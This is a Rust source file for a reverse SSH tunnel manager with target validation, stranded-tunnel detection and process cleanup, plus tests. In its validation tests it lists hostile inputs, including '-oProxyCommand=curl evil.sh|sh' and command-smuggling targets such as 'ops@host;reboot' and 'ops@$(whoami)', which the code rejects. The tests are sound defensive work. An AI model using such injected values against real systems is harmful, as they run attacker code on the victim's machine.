//! Reverse SSH tunnels that publish the loopback listener on a remote host.
use err_mac::create_err_with_impls;
use hashbrown::HashMap;
use parking_lot::Mutex;
use std::process::{Child, Command, ExitStatus, Stdio};
use std::sync::atomic::{AtomicU64, Ordering};

create_err_with_impls!(
    #[derive(Debug)]
    pub TunnelErr,
    NoSuchTunnel,
    NotBound,
    StdIo(std::io::Error)
    ;
    TargetIsOption { target: String },
    MalformedTarget { target: String },
    ProcessTable { status: ExitStatus }
);

/// Bind address for the remote end of every `-R`. `GatewayPorts no` (the sshd default) forces
/// loopback anyway and `clientspecified` honours this; a remote running `GatewayPorts yes`
/// overrides it and publishes the forwarded port on every interface of that host, which no
/// client can prevent and no client can observe from here.
const REMOTE_BIND: &str = "localhost";

/// The hosts a reverse forward names when it points back into this machine's loopback.
const LOOPBACK_HOSTS: [&str; 3] = ["localhost", "127.0.0.1", "::1"];

/// Handle for one open tunnel, unique for the console's lifetime.
#[derive(Clone, Copy, Debug, PartialEq, Eq, Hash)]
pub struct TunnelId(pub u64);

/// What to publish, and where.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct TunnelSpec {
    /// SSH target, e.g. `user@host`.
    pub target: String,
    /// Port the remote host listens on.
    pub remote_port: u16,
    /// Loopback port of this console's listener.
    pub local_port: u16,
}

/// An open tunnel and the `ssh` child that holds it up.
#[derive(Debug)]
pub struct Tunnel {
    /// What this tunnel publishes.
    pub spec: TunnelSpec,
    /// The `ssh -N -R` process; killed and reaped on close.
    pub child: Child,
}

/// Owns every `ssh` child the console spawned, so none outlives the console.
#[derive(Debug)]
pub struct TunnelManager {
    tunnels: Mutex<HashMap<TunnelId, Tunnel>>,
    next_id: AtomicU64,
}

/// An `ssh` reverse forward into a loopback port of this machine that this console did not
/// open: what a session killed before its teardown leaves pointed at whoever binds that port
/// next.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct StrandedTunnel {
    /// Pid of the surviving `ssh`.
    pub pid: u32,
    /// The argv the process table reports for it.
    pub argv: String,
}

/// The exact `ssh` argv for a reverse tunnel: no shell, the remote end pinned to the remote's
/// loopback, fail on a taken remote port, and drop the tunnel within ~45s of the link dying
/// rather than leaving a black hole open.
pub fn ssh_reverse_args(spec: &TunnelSpec) -> Vec<String> {
    vec![
        "-N".to_string(),
        "-o".to_string(),
        "ExitOnForwardFailure=yes".to_string(),
        "-o".to_string(),
        "ServerAliveInterval=15".to_string(),
        "-o".to_string(),
        "ServerAliveCountMax=3".to_string(),
        "-R".to_string(),
        format!(
            "{REMOTE_BIND}:{}:localhost:{}",
            spec.remote_port, spec.local_port
        ),
        spec.target.clone(),
    ]
}

fn is_target_char(c: char) -> bool {
    c.is_ascii_alphanumeric() || matches!(c, '_' | '-' | '.')
}

/// `[user@]host`, as `ssh` reads its last argument. OpenSSH has no `--` terminator, so a
/// target starting with `-` is an option: `-oProxyCommand=...` pasted into the prompt would
/// run that command.
pub fn validate_target(target: &str) -> Result<(), TunnelErr> {
    if target.starts_with('-') {
        return Err(TunnelErr::TargetIsOption {
            target: target.to_string(),
        });
    }
    let (user, host) = match target.split_once('@') {
        Some((user, host)) => (Some(user), host),
        None => (None, target),
    };
    let user_ok = match user {
        Some(user) => !user.is_empty() && user.chars().all(is_target_char),
        None => true,
    };
    if !user_ok || host.is_empty() || !host.chars().all(is_target_char) {
        return Err(TunnelErr::MalformedTarget {
            target: target.to_string(),
        });
    }
    Ok(())
}

/// Every `ssh` in `ps_output` that reverse-forwards a remote port into `local_port` on this
/// machine's loopback. Lines are `pid=,args=`: the pid, a space, then the argv.
pub fn stranded_tunnels(ps_output: &str, local_port: u16) -> Vec<StrandedTunnel> {
    let mut found = Vec::new();
    for line in ps_output.lines() {
        let Some((pid, argv)) = line.trim_start().split_once(' ') else {
            continue;
        };
        let Ok(pid) = pid.parse::<u32>() else {
            continue;
        };
        let mut tokens = argv.split_whitespace();
        if tokens.next().and_then(|p| p.rsplit('/').next()) != Some("ssh") {
            continue;
        }
        while let Some(token) = tokens.next() {
            let Some(attached) = token.strip_prefix("-R") else {
                continue;
            };
            let forward = if attached.is_empty() {
                tokens.next().unwrap_or_default()
            } else {
                attached
            };
            let Some((host, port)) = forward.rsplit_once(':') else {
                continue;
            };
            if !matches!(port.parse::<u16>(), Ok(p) if p == local_port) {
                continue;
            }
            if LOOPBACK_HOSTS.into_iter().any(|h| host.ends_with(h)) {
                found.push(StrandedTunnel {
                    pid,
                    argv: argv.to_string(),
                });
                break;
            }
        }
    }
    found
}

/// Ask the process table which `ssh` processes already forward into `local_port`.
pub fn scan_stranded(local_port: u16) -> Result<Vec<StrandedTunnel>, TunnelErr> {
    let ps = Command::new("/bin/ps")
        .args(["-axo", "pid=,args="])
        .output()?;
    if !ps.status.success() {
        return Err(TunnelErr::ProcessTable { status: ps.status });
    }
    Ok(stranded_tunnels(
        &String::from_utf8_lossy(&ps.stdout),
        local_port,
    ))
}

impl TunnelManager {
    pub fn new() -> Self {
        Self {
            tunnels: Mutex::new(HashMap::new()),
            next_id: AtomicU64::new(1),
        }
    }

    /// Spawn `ssh` for `spec` and record the child under a fresh id.
    pub fn open(&self, spec: TunnelSpec) -> Result<TunnelId, TunnelErr> {
        if spec.local_port == 0 {
            return Err(TunnelErr::NotBound);
        }
        validate_target(&spec.target)?;
        tracing::warn!(
            target = %spec.target,
            remote_bind = REMOTE_BIND,
            remote_port = spec.remote_port,
            local_port = spec.local_port,
            "reverse tunnel pinned to the remote's loopback; a remote sshd set to \
             GatewayPorts=yes overrides that and publishes it on every interface"
        );
        let mut cmd = Command::new("ssh");
        cmd.args(ssh_reverse_args(&spec));
        let id = self.track(cmd, spec)?;
        tracing::info!(id = id.0, "opened reverse tunnel");
        Ok(id)
    }

    /// Spawn `cmd` detached from this console's terminal and record it under a fresh id.
    fn track(&self, mut cmd: Command, spec: TunnelSpec) -> Result<TunnelId, TunnelErr> {
        let child = cmd
            .stdin(Stdio::null())
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .spawn()?;
        let id = TunnelId(self.next_id.fetch_add(1, Ordering::Relaxed));
        self.tunnels.lock().insert(id, Tunnel { spec, child });
        Ok(id)
    }

    /// Every tunnel currently held open, oldest id first.
    pub fn list(&self) -> Vec<(TunnelId, TunnelSpec)> {
        let mut tunnels = self.tunnels.lock();
        tunnels.retain(|id, tunnel| match tunnel.child.try_wait() {
            Ok(None) => true,
            Ok(Some(status)) => {
                tracing::warn!(id = id.0, %status, "tunnel died");
                false
            }
            Err(e) => {
                tracing::warn!(id = id.0, error = %e, "could not poll tunnel");
                true
            }
        });
        let mut live = Vec::with_capacity(tunnels.len());
        for (id, tunnel) in tunnels.iter() {
            live.push((*id, tunnel.spec.clone()));
        }
        drop(tunnels);
        live.sort_by_key(|(id, _)| id.0);
        live
    }

    /// Kill and reap one tunnel.
    pub fn close(&self, id: TunnelId) -> Result<(), TunnelErr> {
        let removed = self.tunnels.lock().remove(&id);
        let Some(mut tunnel) = removed else {
            return Err(TunnelErr::NoSuchTunnel);
        };
        if let Err(e) = tunnel.child.kill() {
            tracing::warn!(id = id.0, error = %e, "could not kill tunnel");
        }
        tunnel.child.wait()?;
        Ok(())
    }

    /// Kill and reap every tunnel; the console is no longer reachable from anywhere.
    pub fn close_all(&self) {
        let drained: Vec<(TunnelId, Tunnel)> = self.tunnels.lock().drain().collect();
        for (id, mut tunnel) in drained {
            if let Err(e) = tunnel.child.kill() {
                tracing::warn!(id = id.0, error = %e, "could not kill tunnel");
            }
            if let Err(e) = tunnel.child.wait() {
                tracing::warn!(id = id.0, error = %e, "could not reap tunnel");
            }
        }
    }
}

impl Default for TunnelManager {
    fn default() -> Self {
        Self::new()
    }
}

impl Drop for TunnelManager {
    fn drop(&mut self) {
        self.close_all();
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// The exposure surface is exactly these flags in this order: `-N` (no shell), the
    /// fail-closed forward option, the two keepalive options, then the `-R` binding that maps
    /// the remote's LOOPBACK port onto this console's loopback port, then the target. Without
    /// the `localhost:` prefix a remote sshd set to `GatewayPorts clientspecified` publishes
    /// the key-release API on every interface it has.
    #[test]
    fn reverse_args_pin_both_ends_to_loopback() {
        let args = ssh_reverse_args(&TunnelSpec {
            target: "ops@tprime2".to_string(),
            remote_port: 7777,
            local_port: 5555,
        });
        assert_eq!(
            args,
            vec![
                "-N",
                "-o",
                "ExitOnForwardFailure=yes",
                "-o",
                "ServerAliveInterval=15",
                "-o",
                "ServerAliveCountMax=3",
                "-R",
                "localhost:7777:localhost:5555",
                "ops@tprime2",
            ]
        );
    }

    /// `ssh` has no `--`, so its last argument is an option whenever it starts with `-`, and
    /// anything outside `[user@]host` shape is a paste rather than a target.
    #[test]
    fn target_validation_rejects_options_and_junk() {
        for good in [
            "ops@tprime2",
            "tprime2",
            "ops@10.0.0.7",
            "ops.d@host-1.example.com",
            "build_bot@x_1",
        ] {
            assert!(validate_target(good).is_ok(), "{good} is a target");
        }
        for bad in ["-oProxyCommand=curl evil.sh|sh", "-4", "-"] {
            assert!(
                matches!(validate_target(bad), Err(TunnelErr::TargetIsOption { .. })),
                "{bad} is an ssh option"
            );
        }
        for bad in [
            "",
            "@host",
            "ops@",
            "ops@a@b",
            "ops@host name",
            "ops@host;reboot",
            "ops@host/../x",
            "ops@$(whoami)",
            "ops@host:22",
        ] {
            assert!(
                matches!(validate_target(bad), Err(TunnelErr::MalformedTarget { .. })),
                "{bad} is not a target"
            );
        }
    }

    /// A tunnel that survived its console re-attaches to whoever binds its local port next,
    /// invisibly. Detection has to read the forward's DESTINATION out of every `-R` shape
    /// (attached or separate argument, with or without a remote bind address) and ignore
    /// forwards into other ports, `-L` forwards, and processes that are not `ssh`.
    #[test]
    fn stranded_scan_finds_reverse_forwards_into_our_port() {
        let ps = concat!(
            "    1 /sbin/launchd\n",
            "  201 ssh -N -o ExitOnForwardFailure=yes -R localhost:7777:localhost:51234 ops@a\n",
            "  202 /usr/bin/ssh -N -R 7777:127.0.0.1:51234 ops@b\n",
            "  203 ssh -N -R51235:localhost:51234 ops@c\n",
            "  204 ssh -N -R *:7777:localhost:51234 ops@d\n",
            "  205 ssh -N -R 7777:localhost:9999 ops@e\n",
            "  206 ssh -N -L 7777:localhost:51234 ops@f\n",
            "  207 ssh -N -R 7777:otherhost:51234 ops@g\n",
            "  208 notssh -N -R 7777:localhost:51234 ops@h\n",
            "  209 ssh ops@i\n",
        );
        let mut pids = Vec::new();
        for tunnel in stranded_tunnels(ps, 51234) {
            pids.push(tunnel.pid);
        }
        assert_eq!(pids, vec![201, 202, 203, 204]);
        assert!(stranded_tunnels(ps, 51236).is_empty());
    }

    fn spec(local_port: u16) -> TunnelSpec {
        TunnelSpec {
            target: "ops@tprime2".to_string(),
            remote_port: 7777,
            local_port,
        }
    }

    fn sleeper(seconds: &str) -> Command {
        let mut cmd = Command::new("/bin/sleep");
        cmd.arg(seconds);
        cmd
    }

    fn pid_of(manager: &TunnelManager, id: TunnelId) -> u32 {
        manager
            .tunnels
            .lock()
            .get(&id)
            .expect("tracked tunnel")
            .child
            .id()
    }

    /// A zombie is still in the process table, so `ps -p` distinguishes killed-and-reaped
    /// from merely killed.
    fn pid_in_process_table(pid: u32) -> bool {
        Command::new("/bin/ps")
            .arg("-p")
            .arg(pid.to_string())
            .stdin(Stdio::null())
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .status()
            .expect("run ps")
            .success()
    }

    /// `close` and `close_all` must kill AND reap, leaving no zombie behind, and `list` must
    /// drop a child that already exited rather than show a dead tunnel as live.
    #[test]
    fn tunnels_are_reaped_on_close_and_pruned_when_they_die() {
        let manager = TunnelManager::new();

        let live = manager
            .track(sleeper("300"), spec(5555))
            .expect("spawn sleeper");
        let live_pid = pid_of(&manager, live);
        assert!(pid_in_process_table(live_pid));
        assert_eq!(manager.list(), vec![(live, spec(5555))]);

        manager.close(live).expect("close tunnel");
        assert!(manager.list().is_empty());
        assert!(!pid_in_process_table(live_pid));
        assert!(matches!(manager.close(live), Err(TunnelErr::NoSuchTunnel)));

        let doomed = manager
            .track(sleeper("0"), spec(6666))
            .expect("spawn sleeper");
        let doomed_pid = pid_of(&manager, doomed);
        let mut pruned = false;
        for _ in 0..100 {
            if manager.list().is_empty() {
                pruned = true;
                break;
            }
            std::thread::sleep(std::time::Duration::from_millis(50));
        }
        assert!(pruned);
        assert!(!pid_in_process_table(doomed_pid));

        let last = manager
            .track(sleeper("300"), spec(7777))
            .expect("spawn sleeper");
        let last_pid = pid_of(&manager, last);
        manager.close_all();
        assert!(manager.list().is_empty());
        assert!(!pid_in_process_table(last_pid));
    }
}
